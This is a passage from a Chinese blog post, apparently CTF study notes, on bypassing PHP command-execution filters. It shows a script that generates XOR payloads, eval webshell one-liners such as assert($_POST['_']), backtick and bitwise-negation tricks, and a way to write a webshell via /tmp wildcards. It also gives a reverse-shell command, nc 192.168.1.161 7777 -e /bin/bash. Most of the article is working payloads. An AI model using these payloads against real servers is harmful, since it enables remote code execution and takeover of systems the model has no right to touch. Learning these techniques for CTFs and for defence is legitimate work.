+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$shell <span class="operator">=</span> $_GET[&quot;cmd&quot;];</span><br><span class="line">$result1 <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">$result2 <span class="operator">=</span> &quot;&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> judge($c)</span><br><span class="line">&#123;</span><br><span class="line">    if(preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$c))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($num<span class="operator">=</span><span class="number">0</span>;$num<span class="operator">&lt;=</span>strlen($shell);$num<span class="operator">+</span><span class="operator">+</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($x<span class="operator">=</span><span class="number">33</span>;$x<span class="operator">&lt;=</span><span class="number">126</span>;$x<span class="operator">+</span><span class="operator">+</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        if(judge(chr($x)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>($y<span class="operator">=</span><span class="number">33</span>;$y<span class="operator">&lt;=</span><span class="number">126</span>;$y<span class="operator">+</span><span class="operator">+</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                if(judge(chr($y)))</span><br><span class="line">                &#123;</span><br><span class="line">                    $f <span class="operator">=</span> chr($x)<span class="operator">^</span>chr($y);</span><br><span class="line">                    if($f <span class="operator">=</span><span class="operator">=</span> $shell[$num])</span><br><span class="line">                    &#123;</span><br><span class="line">                        $result1 .<span class="operator">=</span> chr($x);</span><br><span class="line">                        $result2 .<span class="operator">=</span> chr($y);</span><br><span class="line">                        break <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;异或运算第一部分: &quot;.$result1;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;异或运算第二部分: &quot;.$result2;</span><br><span class="line">?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+cmd=想要执行的命令，运行以上代码，会给出可以得出结果的两个部分
+
+输入?cmd=$_="第一部分"^"第二部分";$_();  (进行URL编码)
+
+# PHP5
+
+assert($_POST['_']);
+
+<?php
+$a='assert';
+$b='_POST';
+$c=$$b;
+$a($c['_']);
+?>
+
+<p>不能写字母可以将abd替换为_、<strong>、</strong>_<br>assert和_POST用异或运算生成<br>输入?cmd&#x3D;$<em>&#x3D;assert部分;$<strong>&#x3D;”第一部分;$</strong></em>&#x3D;$$<strong>;$<em>($</em></strong>[‘_’]);   (进行URL编码)</p>
+<p>在post里面提交 _&#x3D;想要执行的命令</p>
+<h1 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h1><p><code>$_POST[_]</code><br><?php
+$_='_POST';
+$__=$$_;
+`$__[_]`;
+?><br>?cmd&#x3D;<em>POST生成的部分;$__&#x3D;$$</em>;<code>$__[_]</code>;   (进行URL编码)<br>在post里面提交_&#x3D;想要执行的命令<br>_&#x3D;touch a<br>_&#x3D;nc 192.168.1.161 7777 -e &#x2F;bin&#x2F;bash</p>
+<h1 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h1><p>assert _POST  (URL编码)</p>
+<p>$a&#x3D;A;<br>++$a;++$a;<br>echo $a;<br>$a&#x3D;C</p>
+<p>当输入<br>$<em>&#x3D;[].”;<br>echo $</em>;  会返回Array<br>echo $<em>[0];  返回A<br>echo $</em>[$__];  $__返回False，也就是0</p>
+<p>$<em>&#x3D;[].”;<br>$</em><strong>&#x3D;$_[s</strong>];<br>$<strong>&#x3D;$</strong><em>;<br>$</em>&#x3D;$<strong>;<br>++$<em>;++$</em>;++$<em>;++$</em>;++$<em>;++$</em>;++$<em>;++$</em>;++$<em>;++$</em>;++$<em>;++$</em>;++$<em>;++$</em>;++$<em>;++$</em>;++$<em>;++$</em>;<br>$</strong>&#x3D;$_<em>.$</em>  将$__和$_拼接在一起<br>echo $__;  输出AS</p>
+<p>$<em>&#x3D;$</em>_<em>;  会将$<em>变成A可以再重新赋值<br>++$</em>;++$</em>;++$<em>;++$</em>;<br>$_<em>.&#x3D;$</em>;  将值连接</p>
+<p>&#x2F;&#x2F;$__用来记录连接晚的值；$___一直为A；$_重新赋值为新值；</p>
+<p>POST里面输入先要执行的代码</p>
+<h1 id="特殊符号过滤（URL编码）"><a href="#特殊符号过滤（URL编码）" class="headerlink" title="特殊符号过滤（URL编码）"></a>特殊符号过滤（URL编码）</h1><p>1.短标签<br> <?=phpinfo();?></p>
+<p> GET<br> ?&gt;<?`{$~"%a0%b8%ba%ab"}[%a0]`?>取反<br>?cmd&#x3D;?&gt;<?`{$~"%a0%b8%ba%ab"}[%a0]`?>&amp;%a0&#x3D;ls</p>
+<p>POST<br>?cmd&#x3D;?&gt;<?`{${~"%a0%b8%ba%ab"}["-"}`?><br>POST提交参数-&#x3D;ls</p>
+<p>2.下划线和$过滤</p>
+<p>PHP7<br>($a)() $a的地方填函数名，后面括号填参数名<br>call_user_func()函数<br>?cmd&#x3D;(call_user_func)(system,whoami,’’) 取反</p>
+<p>3.PHP5<br> 文件读取<br> POST上传文件将我们上传的文件暂存在&#x2F;tmp目录，默认文件名是phpxxx，文件名最后六位为随机大小写字母<br> .&#x2F;???&#x2F;??????<br> .&#x2F;???&#x2F;?????[@-[] 表示ascii在@和[之内的字符串<br> 文件写入一句话木马，执行</p>
+<h1 id="过滤"><a href="#过滤" class="headerlink" title=";~^&#96;&amp;|过滤"></a>;~^&#96;&amp;|过滤</h1><p> ~^自增法<br> ;短标签</p>
+</表示输入重定向的意思，把<后面跟的文件取代键盘作为新的输入设备></,<>
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/04/22/PHP命令执行/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常见命令执行函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#system%E5%87%BD%E6%95%B0"><span class="toc-number"></span> <span class="toc-text">system函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exec%E5%87%BD%E6%95%B0"><span class="toc-number"></span> <span class="toc-text">exec函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#passthru%E5%87%BD%E6%95%B0"><span class="toc-number"></span> <span class="toc-text">passthru函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shell-exec%E5%87%BD%E6%95%B0"><span class="toc-number"></span> <span class="toc-text">shell_exec函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number"></span> <span class="toc-text">反引号&#96;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#popen%E5%87%BD%E6%95%B0"><span class="toc-number"></span> <span class="toc-text">popen函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#proc-open%E5%87%BD%E6%95%B0"><span class="toc-number"></span> <span class="toc-text">proc_open函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pcntl-exec%E5%87%BD%E6%95%B0"><span class="toc-number"></span> <span class="toc-text">pcntl_exec函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">替换绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">LD_PRELOAD绕过原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%93%BE%E6%8E%A5"><span class="toc-number"></span> <span class="toc-text">程序的链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number"></span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP7"><span class="toc-number"></span> <span class="toc-text">PHP7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">自增绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4%EF%BC%88URL%E7%BC%96%E7%A0%81%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">特殊符号过滤（URL编码）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number"></span> <span class="toc-text">;~^&#96;&amp;|过滤</span></a>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/04/30/SSTI/">SSTI</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/04/12/文件包含/">文件包含</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/04/22/PHP命令执行/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~学习中 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"你要的全拿走","artist":"胡彦彬","url":"https://github.com/Lin060807/music/raw/main/你要的全拿走.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"年轮","artist":"张碧晨","url":"https://github.com/Lin060807/music/raw/main/年轮.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
